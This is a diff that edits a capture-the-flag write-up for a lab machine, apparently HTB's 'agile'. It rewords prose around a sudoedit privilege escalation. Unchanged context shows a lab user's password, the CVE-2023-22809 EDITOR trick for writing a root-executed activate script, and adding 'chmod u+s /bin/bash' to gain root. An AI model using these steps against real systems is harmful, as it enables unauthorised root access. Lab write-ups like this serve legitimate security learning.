@@ -143,7 +143,7 @@ User edwards may run the following commands on agile:
     (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
 ```
 
-In short, we edit some files as `dev_admin`. I read a few of the files and found some interesting input:
+In short, we edit some files as `dev_admin`. I read files and found some credentials
 
 {% code overflow="wrap" %}
 ```
@@ -154,7 +154,7 @@ edwards:1d7ffjwrx#$d6qn!9nndqgde4
 ```
 {% endcode %}
 
-The SQL database didn't show me much of anything really. However, using `sudoedit` is rather strange. I ran a `pspy64` to see if there were any exploitable processes. This one line looked rather suspicious:
+However, the credentials here lead to dead ends, with the SQL database having nothing of interest. I ran a `pspy64` to see if there were any exploitable processes. This one line looked rather suspicious because `dev_admin` had write access to it:
 
 {% code overflow="wrap" %}
 ```
@@ -165,7 +165,7 @@ edwards@agile:/tmp$ ls -la /app/venv/bin/activate
 ```
 {% endcode %}
 
-This is writeable by the `dev_admin` user. Checking the `sudo` version online, I found that it was vulnerable to CVE-2023-22809.
+Checking the `sudo` version online, I found that it was vulnerable to CVE-2023-22809.
 
 In short, this exploit allows us to write in **any file we want** using `sudoedit` despite the restrictions we have in place. The `activate` file I found earlier was a `bash` script being executed by root. So, all we need to do is append some commands to it to make `/bin/bash` an SUID binary.
 
@@ -178,6 +178,6 @@ export EDITOR='vim -- /app/venv/bin/activate'
 sudo -u dev_admin sudoedit /app/config_test.json
 ```
 
-This opens up the `activate` file and we are free to edit it! We can add `chmod u+s /bin/bash` into it. Then we can easily become `root` and pwn the machine!
+This opens up the `activate` file and we are free to edit it. We can add `chmod u+s /bin/bash` into it. Then we can easily become `root`.
 
 <figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>
